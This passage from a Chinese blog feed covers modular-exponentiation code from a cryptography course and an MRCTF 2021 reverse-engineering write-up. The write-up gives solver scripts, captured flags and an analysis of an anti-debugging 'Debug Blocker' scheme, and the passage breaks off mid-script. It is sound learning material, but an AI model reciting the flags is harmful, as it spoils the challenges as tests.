(ans_76*ans_76*(<span class="keyword">int</span>)<span class="built_in">pow</span>(a_76, s_76[cnt_76]))%n_76;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"i = %d, b = %d, ans_76 = ans_76*ans_76*a_76^%d(mod %d) = %d\n"</span>, i_76++, s_76[cnt_76], s_76[cnt_76], n_76, ans_76);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"结果为：%d\n"</span>, ans_76);</span><br><span class="line"><span class="keyword">return</span> ans_76;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.模重复平方法。</strong></p><p>计算整体思想：将指数分为多个2次方相加的形式，然后重复平方。</p><p>也是先将指数转化位二进制的形式，然后从低位开始，依次计算，下面的n1是每个二进制位，表示是0或者1。</p><p><img src="/2021/04/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6/image-20210417163737881.png" alt="image-20210417163737881"></p><p><strong>其中的重复重复平方是每轮都要进行的，只是根据指数的二进制位的0来决定是否将其乘到结果中去。</strong></p><p>C语言实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">powerMod_76</span><span class="params">(<span class="keyword">int</span> a_76, <span class="keyword">int</span> m_76, <span class="keyword">int</span> n_76)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans_76 = <span class="number">1</span>, s_76[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, i_76 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(; m_76; m_76 &gt;&gt;= <span class="number">1</span>, i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> tmp_76 = m_76&amp;<span class="number">1</span>;</span><br><span class="line">ans_76 = (ans_76*(<span class="keyword">int</span>)<span class="built_in">pow</span>(a_76, tmp_76))%n_76;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"i = %d: b = %d, ans_76 = ans_76*a_76^%d(mod %d) = %d\n"</span>, i_76, tmp_76, tmp_76, n_76, ans_76);</span><br><span class="line"></span><br><span class="line">a_76 = (a_76*a_76)%n_76;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"i = %d: a_76 = a_76*a_76(mod %d) = %d\n"</span>, i_76, n_76, a_76);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"结果为：%d\n"</span>, ans_76);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans_76;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a_76, m_76, n_76;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"请输入数字（a, m, n）:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;a_76, &amp;m_76, &amp;n_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"用平方乘算法的计算过程为："</span>);</span><br><span class="line">LRFun_76(a_76, m_76, n_76);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>), <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"用模重复平方法的计算过程为："</span>);</span><br><span class="line">powerMod_76(a_76, m_76, n_76);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Course </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021MRCTF</title>
      <link href="/2021/04/12/2021MRCTF/"/>
      <url>/2021/04/12/2021MRCTF/</url>
      
        <content type="html"><![CDATA[<p>个人解题赛，做完了逆向题，总排名第5。<a id="more"></a></p><p><img src="https://i.loli.net/2021/04/12/51u7kH9FpMJdqsv.png" alt="image-20210412210153457"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Real-CHECKIN"><a href="#Real-CHECKIN" class="headerlink" title="Real_CHECKIN"></a>Real_CHECKIN</h3><p>换表base64加密，找到表：abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/</p><p>密文：tvjdvez7D0vSyZbnzv90mf9nuKnurL8YBZiXiseHFq==</p><p>简单写一下换表脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"</span></span><br><span class="line">table = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line">enc = <span class="string">"tvjdvez7D0vSyZbnzv90mf9nuKnurL8YBZiXiseHFq=="</span></span><br><span class="line">ans = enc.translate(str.maketrans(table, s))</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(ans))</span><br><span class="line"></span><br><span class="line"><span class="comment">#MRCTF&#123;wElc0Me_t0_MRCTF_2o21!!!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Dynamic-Debug"><a href="#Dynamic-Debug" class="headerlink" title="Dynamic Debug"></a>Dynamic Debug</h3><p>来到main函数，首先对输入的字符的长度进行了一个判断：</p><p><img src="https://i.loli.net/2021/04/12/NRJXFg6s3hcDoEz.png" alt="image-20210411224811890"></p><p>到关键函数sub_402500（），不能直接反编译，那就简单的分析一下汇编，开始是花指令之类的东西，后面也就是简单比较输入是否为：MRCTF{IS_THIS_REAL?ASK_YOURSELF}，很明显这是假的。</p><p><img src="https://i.loli.net/2021/04/12/MYQAVZPiWKBgCzX.png" alt="image-20210411225042628"></p><p>调试一波找到对代码修改的地方：其实不关心细节，直接动调跟进我们输入字符后的函数，直接就是解密后的代码，修复一下即可。这里我做题时ida和犯病了一样，动调得到那个解密后的代码怎么都不对，，后面单步步入找原因，再次到达解密后的代码又对了，现在想模拟一下当时出错的情况，看原因，又一直不错（。。</p><p><img src="https://i.loli.net/2021/04/12/u2mL6S4ovfjPykR.png" alt="image-20210411225843676"></p><p>这里手动patch不太方便，还要dump出异或流。就直接动调得到，一个清晰明了的tea结构加密：</p><p><img src="https://i.loli.net/2021/04/12/AJnycbCNZvKH8kF.png" alt="image-20210411230306051"></p><p>解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] = &#123;<span class="number">153</span>, <span class="number">161</span>, <span class="number">133</span>,  <span class="number">85</span>, <span class="number">104</span>,  <span class="number">93</span>, <span class="number">130</span>, <span class="number">126</span>,  <span class="number">57</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">77</span>, <span class="number">148</span>,  <span class="number">67</span>, <span class="number">105</span>, <span class="number">114</span>, <span class="number">113</span>,   <span class="number">6</span>,  <span class="number">67</span>,  <span class="number">81</span>, <span class="number">106</span>, </span><br><span class="line">    <span class="number">0</span>, <span class="number">173</span>,  <span class="number">20</span>,  <span class="number">75</span>,  <span class="number">63</span>,  <span class="number">13</span>, <span class="number">210</span>, <span class="number">100</span>,  <span class="number">21</span>, <span class="number">219</span>, </span><br><span class="line">   <span class="number">55</span>, <span class="number">159</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v5 = <span class="number">0x6B696C69</span>,</span><br><span class="line">     v4 = <span class="number">0x79645F65</span>,</span><br><span class="line">     v3 = <span class="number">0x696D616E</span>,</span><br><span class="line">     v2 = <span class="number">0x67626463</span>;</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">get_delat</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans = <span class="number">0</span>, delat = <span class="number">0x9E3779B9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">ans += delat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tea_decode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ENC+<span class="number">8</span>*i);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> delat = get_delat();</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">31</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">enc[<span class="number">1</span>] -= (enc[<span class="number">0</span>] + delat) ^ (enc[<span class="number">0</span>]*<span class="number">16</span>+v3) ^ ((enc[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>)+v2);</span><br><span class="line">enc[<span class="number">0</span>] -= (enc[<span class="number">1</span>] + delat) ^ (enc[<span class="number">1</span>]*<span class="number">16</span>+v5) ^ ((enc[<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)+v4);</span><br><span class="line">delat -= <span class="number">0x9E3779B9</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">tea_decode();</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, ENC[i]);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//MRCTF&#123;Dyn4m1c_d3buG_1s_a_ki11eR&#125;</span></span><br></pre></td></tr></table></figure><h3 id="MR-Register"><a href="#MR-Register" class="headerlink" title="MR_Register"></a>MR_Register</h3><p>考点：Debug Blocker技术。</p><p>程序的关键在子进程。分析方法很多，但绝大多数，只要找到这个技术关键点，静态分析和动调父进程看子进程反馈就好了，如果数据复杂了，可以附加调试看内存加以辅助。</p><p>首先根据函数的特征结构找到main函数，</p><p><img src="https://i.loli.net/2021/04/12/RXUsE7vLtpea9gl.png" alt="image-20210411235747150"></p><p>来看main函数，刚刚开始看的时候疑惑了一会儿，为什么这个在调试状态下才执行程序的关键逻辑，经过后面的创建进程函数发现：其实这里的if else语句就区别了父进程与子进程执行不同的语句，因为创建出的子进程是调试模式运行的。这里关注一下创建进程的<strong>dwCreationFlags</strong>参数，分析程序是将其转换一下枚举的含义好看一些。</p><p><img src="https://i.loli.net/2021/04/12/2i1PyKHlcACXqog.png" alt="image-20210412111156696"></p><blockquote><p>dwCreationFlags标识了影响新进程创建方式的标志：</p><p><strong>DEBUG_PROCESS：如果这个标志被设置，调用进程将被当作一个调试程序，并且新进程会被当作被调试的进程。系统把被调试程序发生的所有调试事件通知给调试器。</strong></p><p><strong>DEBUG_ONLY_THIS_PROCESS：如果这个标志被设置，调用进程将被当作一个调试程序，并且新进程会被当作被调试的进程。系统把被调试程序发生的所有调试事件通知给调试器。</strong></p><p><strong>上面2个不同点在于DEBUG_PROCESS会调试被调试进程以及它的所有子进程，而DEBUG_ONLY_THIS_PROCESS只调试被调试进程，不调试它的子进程。</strong></p></blockquote><p>继续就是分析后面父进程处理子进程异常的部分sub_40188D()：</p><p><img src="https://i.loli.net/2021/04/12/NsBlrSXueFjwH2C.png" alt="image-20210412111950176"></p><p>关键是看DebugEvent.dwDebugEventCode == 1的活动：接受处理来自子进程的异常，进而修改子进程代码。</p><p><img src="https://i.loli.net/2021/04/12/szbXIDkcymFJGUo.png" alt="image-20210412112837615"></p><p>所以现在关键就是要去寻找子进程要执行函数中出现触发异常地方，进而对着父进程处理模块分析。这里我直接调试了下父进程，记录它处理子进程异常的位置和处理方式，随后自己用idapython去patch一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">第一次交互：通过除<span class="number">0</span>异常触发</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">374</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">    Buffer[i] ^= Buffer[i + <span class="number">1</span>] ^ i;             <span class="comment">// 对表进行了一个简单异或运算。</span></span><br><span class="line">  Buffer[<span class="number">375</span>] = <span class="number">120</span>;</span><br><span class="line">rip += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">第二次交互：通过int3交互，解密代码。</span><br><span class="line">地址：<span class="number">0x0000401E1C</span></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x57D</span>; ++i )</span><br><span class="line">    *((_BYTE *)v5 + i) ^= i;</span><br><span class="line">  </span><br><span class="line">rip += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">第三次，在patch后的代码第一次遇到int3,触发异常交互：</span><br><span class="line">rip += <span class="number">2</span></span><br></pre></td></tr></table></figure><p>patch文件，并nop无用的代码：</p><p><img src="https://i.loli.net/2021/04/14/2xEwBcXAsW4thbu.png" alt="mwGU5aZ38l4PAWc"></p><p>随后分析程序的关键流程，也就是子进程执行的，先创建一个文件，将输入进行加密后的数据写入该文件中，最后取出文件中的数据与指定编码数据对比。</p><p>而关键加密函数就是之前patch后的：就是用我们的输入可见字符，因为最高为0，所以只用了7位，分成3 3 1三部分作为index，置换表的过程。这里的email其实并没有作为比较，看到最后用了有一个异或操作，而在最后的比对过程中也有一个同样的操作，就还原了，所以密文就是不经过异或加密后的结果。<br><img src="https://i.loli.net/2021/04/12/wfFu2ZJQS6IL4N1.png" alt="image-20210412114342071"></p><p>最后先爆破，再进行一个bytes.fromhex()，最后一个减法。比赛时赶时间写的，比较水，用python处理起来方便一些。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> enc[] = &#123;<span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">84</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">84</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">84</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">69</span>, <span class="number">120</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> table[<span class="number">9</span>][<span class="number">9</span>] = &#123;<span class="string">"ABCDEFGH"</span>, <span class="string">"12345678"</span>, <span class="string">"0IJKLMNO"</span>, <span class="string">"+OPQRStu"</span>, </span><br><span class="line"><span class="string">"\\vwxyzTU"</span>, <span class="string">"abcdefgh"</span>, <span class="string">"VWXYZijk"</span>, <span class="string">"lmnopqrs"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, v25, v24, v23, ans1, ans2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">12</span>; i &lt; <span class="keyword">sizeof</span>(enc)<span class="number">-1</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> ch = j;</span><br><span class="line">v25 = (ch &gt;&gt; <span class="number">6</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    v24 = (ch &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>;</span><br><span class="line">    v23 =  ch &amp; <span class="number">7</span>;</span><br><span class="line">    ans1 = table[v25][v24];</span><br><span class="line">    ans2 = table[v24][v23];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(ans1 == enc[i] &amp;&amp; ans2 == enc[i+<span class="number">1</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">putchar</span>(j);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf("%d %d", ans1, ans2);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span 